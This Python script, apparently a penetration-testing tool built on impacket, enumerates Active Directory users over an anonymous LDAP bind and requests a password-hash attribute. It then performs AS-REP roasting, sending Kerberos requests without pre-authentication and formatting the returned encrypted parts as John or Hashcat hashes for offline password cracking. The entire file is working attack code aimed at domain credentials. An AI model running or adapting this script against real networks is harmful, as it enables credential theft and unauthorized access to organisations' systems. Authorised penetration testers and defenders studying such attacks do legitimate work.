#!/usr/bin/env python3

from impacket.ldap import ldap, ldapasn1
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
from impacket.krb5.kerberosv5 import sendReceive, KerberosError
from impacket.krb5.types import KerberosTime, Principal
from binascii import hexlify
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
import ldap as _ldap
import random
import json
import sys
from datetime import datetime, timedelta
import logging


class enumLdap:
    def __init__(self, target):
        self.target = target
        self.ll = _ldap.initialize(f'ldap://{self.target}')
        self.__colLen = [20, 30, 19, 19]
        self.__outputFormat = ' '.join(['{%d:%ds} ' % (num, width) for num, width in enumerate(self.__colLen)])
        self.users = []
        self.cache = {}

    def get_base_context(self):
        if "base_domain" in self.cache:
            return self.cache['base']
        else:
            top_level = self.ll.search_s('', _ldap.SCOPE_BASE, 'objectClass=top')
            naming_context = top_level[0][1]['namingContexts'][0].decode('utf-8')
            # print(f"Naming Context: {naming_context}")
            self.cache['base'] = naming_context
            return naming_context

    def get_domain(self):
        base = self.get_base_context()
        domain = base.replace('DC=', '').replace(',', '.')
        return domain

    @staticmethod
    def getUnixTime(t):
        t -= 116444736000000000
        t /= 10000000
        return t

    def processRecord(self, item):
        if isinstance(item, ldapasn1.SearchResultEntry) is not True:
            return
        sAMAccountName = ''
        pwdLastSet = ''
        mail = ''
        lastLogon = 'N/A'
        data = {}
        try:
            for attribute in item['attributes']:
                if str(attribute['type']) == 'sAMAccountName':
                    if attribute['vals'][0].asOctets().decode('utf-8').endswith('$') is False:
                        # User Account
                        sAMAccountName = attribute['vals'][0].asOctets().decode('utf-8')
                        data['sAMAccountName'] = sAMAccountName
                elif str(attribute['type']) == 'pwdLastSet':
                    if str(attribute['vals'][0]) == '0':
                        pwdLastSet = '<never>'
                    else:
                        pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    data['pwdLastSet'] = pwdLastSet
                elif str(attribute['type']) == 'lastLogon':
                    if str(attribute['vals'][0]) == '0':
                        lastLogon = '<never>'
                    else:
                        lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    data['lastLogon'] = lastLogon
                elif str(attribute['type']) == 'mail':
                    mail = str(attribute['vals'][0])
                    data['mail'] = mail
            self.users.append(data)
            # print((self.__outputFormat.format(*[sAMAccountName, mail, pwdLastSet, lastLogon])))
        except Exception as e:
            logging.debug("Exception", exc_info=True)
            logging.error('Skipping item, cannot process due to error %s' % str(e))
            pass

    def get_all_users(self):
        if "users" in self.cache:
            return self.cache['users']
        else:
            try:
                self.users = []
                ldapConnection = ldap.LDAPConnection(f'ldap://{self.target}', self.get_base_context(), None)
                ldapConnection.login('', '', self.get_domain(), '', '')
                searchFilter = "(&(sAMAccountName=*)(objectCategory=user))"
                sc = ldap.SimplePagedResultsControl(size=100)
                ldapConnection.search(searchFilter=searchFilter,
                                      attributes=['sAMAccountName', 'pwdLastSet', 'mail', 'lastLogon', 'sambaNTPassword'],
                                      sizeLimit=0, searchControls=[sc], perRecordCallback=self.processRecord)
                return self.users
            except ldap.LDAPSearchError:
                raise
            ldapConnection.close()

    def get_tgt(self, userName, requestPAC=True):

        clientName = Principal(userName, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        asReq = AS_REQ()

        domain = self.get_domain().upper()
        serverName = Principal('krbtgt/%s' % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        pacRequest = KERB_PA_PAC_REQUEST()
        pacRequest['include-pac'] = requestPAC
        encodedPacRequest = encoder.encode(pacRequest)

        asReq['pvno'] = 5
        asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)

        asReq['padata'] = noValue
        asReq['padata'][0] = noValue
        asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        asReq['padata'][0]['padata-value'] = encodedPacRequest

        reqBody = seq_set(asReq, 'req-body')

        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.proxiable.value)
        reqBody['kdc-options'] = constants.encodeFlags(opts)

        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        seq_set(reqBody, 'cname', clientName.components_to_asn1)

        if domain == '':
            raise Exception('Empty Domain not allowed in Kerberos')

        reqBody['realm'] = domain

        now = datetime.utcnow() + timedelta(days=1)
        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['rtime'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)

        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)

        seq_set_iter(reqBody, 'etype', supportedCiphers)

        message = encoder.encode(asReq)

        try:
            r = sendReceive(message, domain, self.target)
        except KerberosError as e:
            if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                # RC4 not available, OK, let's ask for newer types
                supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
                seq_set_iter(reqBody, 'etype', supportedCiphers)
                message = encoder.encode(asReq)
                r = sendReceive(message, domain, self.target)
            else:
                raise e

        # This should be the PREAUTH_FAILED packet or the actual TGT if the target principal has the
        # 'Do not require Kerberos preauthentication' set
        try:
            asRep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
        except:
            # Most of the times we shouldn't be here, is this a TGT?
            asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
        else:
            # The user doesn't have UF_DONT_REQUIRE_PREAUTH set
            raise Exception('User %s doesn\'t have UF_DONT_REQUIRE_PREAUTH set' % userName)

        if self.__outputFormat == 'john':
            # Let's output the TGT enc-part/cipher in John format, in case somebody wants to use it.
            return '$krb5asrep$%s@%s:%s$%s' % (clientName, domain,
                                               hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
                                               hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())
        else:
            # Let's output the TGT enc-part/cipher in Hashcat format, in case somebody wants to use it.
            return '$krb5asrep$%d$%s@%s:%s$%s' % (asRep['enc-part']['etype'], clientName, domain,
                                                  hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
                                                  hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())
